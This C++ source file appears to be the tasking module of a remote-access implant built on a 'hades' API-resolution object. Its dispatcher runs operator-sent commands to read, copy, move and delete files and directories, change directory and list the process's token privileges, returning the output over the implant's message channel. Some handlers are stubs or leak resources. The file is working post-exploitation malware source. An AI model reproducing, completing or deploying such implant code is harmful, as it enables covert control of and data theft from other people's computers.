#include "cmds.hpp"
#include <stdio.h>


enum CMD_ACTION_CODES {
	CMD_CODE_PS,
	CMD_CODE_CMD,
	CMD_CODE_CAT,
	CMD_CODE_LS,
	CMD_CODE_RM,
	CMD_CODE_MV,
	CMD_CODE_PWD,
	CMD_CODE_CD,
	CMD_CODE_CP,
	CMD_CODE_RMDIR,
	CMD_CODE_GETPRIVS,
};



BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
	g_ByteMgr->InitRead(Data, size);
	g_ByteMgr->Write4(MSG_TYPE_OUTPUT);
	UINT TotalCommands = g_ByteMgr->Read4();
	g_ByteMgr->Write4(TotalCommands);
	for (INT i = 0; i < TotalCommands; i++) {
		UINT CmdCode = g_ByteMgr->Read4();
		switch (CmdCode)
		{
		case CMD_CODE_LS:
			do_ls();
			break;
		case CMD_CODE_MV:
			do_mv();
			break;

		case CMD_CODE_PWD:
			do_pwd();
			break;

		case CMD_CODE_CD:
			do_cd();
			break;

		case CMD_CODE_CAT:
			do_cat();
			break;

		case CMD_CODE_CP:
			do_cp();
			break;

		case CMD_CODE_RMDIR:
			do_rmdir();
			break;

		case CMD_CODE_RM:
			do_rm();
			break;

		case CMD_CODE_GETPRIVS:
			do_getprivs();
			break;
		default:
			break;
		}

	}

	return TRUE;
}


// todo, cleanup this, also make output prettier
void commanders::do_getprivs() {
	PTOKEN_PRIVILEGES TokenPrivs = NULL;
	PCHAR buf					 = NULL;
	HANDLE hToken				 = NULL;

	ULONG size      = 0;
	NTSTATUS Stat   = 0;
	DWORD StatusLen = 0;
	DWORD TotalSize = 0;
	DWORD capacity  = 0;
	


	g_ByteMgr->BeginTask();
	
	Stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		return;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &size);
	TokenPrivs = AllocMemory<TOKEN_PRIVILEGES>(size);
	if (!TokenPrivs) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, TokenPrivs, size, &size);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_FAILED_TOKENS);
		return;
	}

	
	capacity = TokenPrivs->PrivilegeCount * 300;
	buf = AllocMemory<CHAR>(capacity);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	for (DWORD i = 0; i < TokenPrivs->PrivilegeCount; i++) {
		LUID_AND_ATTRIBUTES Priv = TokenPrivs->Privileges[i];

		CHAR name[256] = { 0 };
		DWORD NameLne = sizeof(name);
		if (!hades->WinApis.LookupPrivilegeNameA(NULL, &Priv.Luid, name, &NameLne)) {
			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
			goto CLEANUP;
		}

		const char* Status;
		if (Priv.Attributes & SE_PRIVILEGE_REMOVED) {
			Status = "Removed"; StatusLen = 7;
		} 
		else if (Priv.Attributes & SE_PRIVILEGE_ENABLED) {
			Status = "Enabled"; StatusLen = 7;
		}
		else if (Priv.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
			Status = "Enabled by Default"; StatusLen = 18;
		}
		else {
			Status = "Disabled"; StatusLen = 8;
		}

		char merged[512];
		DWORD entryLen = NameLne + 1 + StatusLen;
		memcpy(merged, name, NameLne);
		merged[NameLne] = ' ';
		memcpy(merged + NameLne + 1, Status, StatusLen);
		merged[entryLen] = '\n';
		
		if (TotalSize + entryLen + 1 > capacity) {
			capacity *= 2;
			buf = (PCHAR)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
		}
		memcpy(buf + TotalSize, merged, entryLen + 1);
		TotalSize += entryLen + 1;
	}
	if (TotalSize > 0) { buf[TotalSize - 1] = '\0'; }
	g_ByteMgr->EndOkData((PBYTE)buf, TotalSize);
	
CLEANUP:
	
	if (TokenPrivs)   { HeapFree(GetProcessHeap(), 0, TokenPrivs); }
	if (buf)          { HeapFree(GetProcessHeap(), 0, buf);        }
	if (hToken)       { hades->WinApis.CloseHandle(hToken);        }
	return;
}



void commanders::do_cat() {
	BOOL Result     = FALSE;
	HANDLE hFile    = NULL;
	PBYTE buf       = NULL;
	DWORD ChunkSize = 2048;
	DWORD BytesRead = 0;
	
	
	g_ByteMgr->BeginTask();

	UINT FileLen = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(FileLen);

	hFile = hades->WinApis.CreateFileA(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	buf = AllocMemory<BYTE>(ChunkSize);
	Result = hades->WinApis.ReadFile(hFile, (PBYTE)buf, ChunkSize, &BytesRead, NULL);
	if (Result) {
		g_ByteMgr->EndOkData(buf, BytesRead);
		goto CLEANUP;
	}
	else {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	if (buf)      { HeapFree(GetProcessHeap(), 0, buf); }
	if (hFile)    { hades->WinApis.CloseHandle(hFile); }
	return;



}




void commanders::do_ls() {
	return;
}

void commanders::do_cp() {
	g_ByteMgr->BeginTask();

	UINT srcLen = g_ByteMgr->Read4();
	PCHAR src   = g_ByteMgr->ReadString(srcLen);
	UINT dstLen = g_ByteMgr->Read4();
	PCHAR dst   = g_ByteMgr->ReadString(dstLen);

	BOOL Result = hades->WinApis.CopyFileA(src, dst, FALSE);
	if (!Result) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndErr(CP_SUCCESS);
CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); }
	if (dst) { g_ByteMgr->FreeString(dst); }
	return;

}


void commanders::do_rmdir() {
	g_ByteMgr->BeginTask();

	UINT DirLen   = g_ByteMgr->Read4();
	PCHAR DirName = g_ByteMgr->ReadString(DirLen);

	if (!hades->WinApis.RemoveDirectoryA(DirName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndErr(RMDIR_SUCCESS);

CLEANUP:
	if (DirName) { g_ByteMgr->FreeString(DirName); }
	return;
}

void commanders::do_rm() {
	g_ByteMgr->BeginTask();

	UINT NameLen   = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(NameLen);

	if (!hades->WinApis.DeleteFileA(FileName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndErr(RM_SUCCESS);

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	return;
}

void commanders::do_cd() {
	g_ByteMgr->BeginTask();

	UINT DirLen = g_ByteMgr->Read4();
	PCHAR dir   = g_ByteMgr->ReadString(DirLen);
	if (!hades->WinApis.SetCurrentDirectoryA(dir)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	g_ByteMgr->EndErr(CD_SUCCESS);
CLEANUP:
	if (dir) { g_ByteMgr->FreeString(dir); }
	return;
}

void commanders::do_pwd() {
	DWORD Res = 0;
	UINT TaskID = g_ByteMgr->BeginTask();

	DWORD size = hades->WinApis.GetCurrentDirectoryA(0, NULL);

	PCHAR buf = AllocMemory<CHAR>(size);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Res = hades->WinApis.GetCurrentDirectoryA(size, buf);
	if (Res == 0 || Res >= size) {
	
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	g_ByteMgr->EndOkData((PBYTE)buf, Res);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	return;

	return;
}

void commanders::do_mv() {
	UINT TaskID = g_ByteMgr->BeginTask();

	UINT srclen = g_ByteMgr->Read4();
	PCHAR src = g_ByteMgr->ReadString(srclen);
	UINT dstlen = g_ByteMgr->Read4();
	PCHAR dest = g_ByteMgr->ReadString(dstlen);

	if (!hades->WinApis.MoveFileA(src, dest)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndErr(MV_SUCCESS);

CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); };
	if (dest) { g_ByteMgr->FreeString(dest); }
	return;

}




commanders* g_Commander = NULL;